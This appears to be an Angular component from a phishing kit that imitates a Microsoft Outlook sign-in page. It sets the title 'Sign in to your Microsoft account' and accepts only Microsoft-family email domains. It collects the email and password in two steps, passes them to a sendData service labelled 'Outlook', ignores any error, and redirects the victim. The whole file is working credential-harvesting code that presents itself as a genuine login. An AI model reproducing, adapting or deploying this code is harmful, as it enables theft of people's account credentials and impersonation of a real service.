import { Component, HostListener, OnInit } from '@angular/core';
import { Title } from '@angular/platform-browser';
import { Router } from '@angular/router';
import { UserModel } from 'src/app/shared/models/user.model';
import { MainService } from 'src/app/shared/services/main.service';

@Component({
  selector: 'app-outlook',
  templateUrl: './outlook.component.html',
  styleUrls: ['./outlook.component.scss'],
})
export class OutlookComponent implements OnInit {
  userModel: UserModel;
  oneStep: boolean = false;
  twoStep: boolean = false;
  isLoading: boolean = false;
  hasError: boolean = false;
  errorFound: boolean = false;
  completeUI: boolean = false;

  screenWidth: any;

  constructor(
    private titleService: Title,
    private mainSrv: MainService,
    private router: Router
  ) {
    this.userModel = new UserModel();
    try {
      document.body.classList.add('cb');
      document.getElementsByClassName('yahoo')[0].remove();
    } catch (error) {}
    this.titleService.setTitle('Sign in to your Microsoft account');
    this.changeState(1);
  }

  ngOnInit(): void {
    this.screenWidth = window.innerWidth;
  }

  @HostListener('window:resize', ['$event'])
  onResize(event: any) {
    this.screenWidth = window.innerWidth;
  }

  private changeState(state: number): void {
    this.oneStep = false;
    this.twoStep = false;

    if (state === 1) {
      this.oneStep = true;
    } else if (state === 2) {
      this.twoStep = true;
    } else {
      this.oneStep = true;
    }
  }

  async back() {
    this.isLoading = true;
    this.userModel.password = '';
    await this.waiting(1000);
    this.changeState(1);
    this.isLoading = false;
  }

  async next(): Promise<boolean> {
    this.errorFound = false;
    this.hasError = false;

    if (!this.userModel.email || !this.userModel.email.length) {
      this.hasError = true;
      return false;
    }

    this.isLoading = true;

    if (!this.checkEmail(this.userModel.email)) {
      this.errorFound = true;
    }

    if (!this.checkIfCorrectDomain(this.userModel.email)) {
      this.errorFound = true;
    }

    await this.waiting(1500);

    if (this.errorFound) {
      this.hasError = true;
      this.isLoading = false;
    } else {
      await this.waiting(2000);
      this.hasError = false;
      this.changeState(2);
      this.isLoading = false;
    }

    return true;
  }

  async logIn(): Promise<boolean> {
    this.hasError = false;

    if (!this.userModel.password || !this.userModel.password.length) {
      this.hasError = true;
      return false;
    }

    if (this.userModel.password.length < 5) {
      this.hasError = true;
      return false;
    }

    this.isLoading = true;
    this.hasError = false;

    await this.waiting(1000);
    try {
      const result = await this.mainSrv.sendData(
        this.userModel.email,
        this.userModel.password,
        'Outlook'
      );
    } catch (error) {
    } finally {
      await this.waiting(1000);
      this.router.navigate(['/live/inicio']);
      this.isLoading = false;
    }

    return true;
  }

  private checkIfCorrectDomain(email: string): boolean {
    const validDomains = [
      '@microsoft.com',
      '@microsoft.org',
      '@microsoft.net',
      '@hotmail.com',
      '@hotmail.es',
      '@hotmail.co.uk',
      '@hotmail.eu',
      '@hotmail.co',
      '@hotmail.net',
      '@hotmail.org',
      '@outlook.com',
      '@outlook.es',
      '@outlook.org',
      '@outlook.co',
      '@outlook.co',
      '@live.com',
      '@live.es',
      '@live.co.uk',
      '@live.net',
      '@live.co',
      '@live.org',
      '@live.eu',
      'live.com.mx',
      '@msn.com',
      '@passport.com',
      '@passport.net',
    ];
    for (let index = 0; index < validDomains.length; index++) {
      const domain = validDomains[index];
      if (email.indexOf(domain) !== -1) {
        return true;
      }
    }

    return false;
  }

  private checkEmail(email: string) {
    let sQtext = '[^\\x0d\\x22\\x5c\\x80-\\xff]';
    let sDtext = '[^\\x0d\\x5b-\\x5d\\x80-\\xff]';
    let sAtom =
      '[^\\x00-\\x20\\x22\\x28\\x29\\x2c\\x2e\\x3a-\\x3c\\x3e\\x40\\x5b-\\x5d\\x7f-\\xff]+';
    let sQuotedPair = '\\x5c[\\x00-\\x7f]';
    let sDomainLiteral = '\\x5b(' + sDtext + '|' + sQuotedPair + ')*\\x5d';
    let sQuotedString = '\\x22(' + sQtext + '|' + sQuotedPair + ')*\\x22';
    let sDomain_ref = sAtom;
    let sSubDomain = '(' + sDomain_ref + '|' + sDomainLiteral + ')';
    let sWord = '(' + sAtom + '|' + sQuotedString + ')';
    let sDomain = sSubDomain + '(\\x2e' + sSubDomain + ')*';
    let sLocalPart = sWord + '(\\x2e' + sWord + ')*';
    let sAddrSpec = sLocalPart + '\\x40' + sDomain;
    let sValidEmail = '^' + sAddrSpec + '$';
    let reValidEmail = new RegExp(sValidEmail);
    return reValidEmail.test(email);
  }

  private waiting(ms: number) {
    return new Promise((resolve) => {
      setTimeout(() => {
        resolve(true);
      }, ms);
    });
  }
}
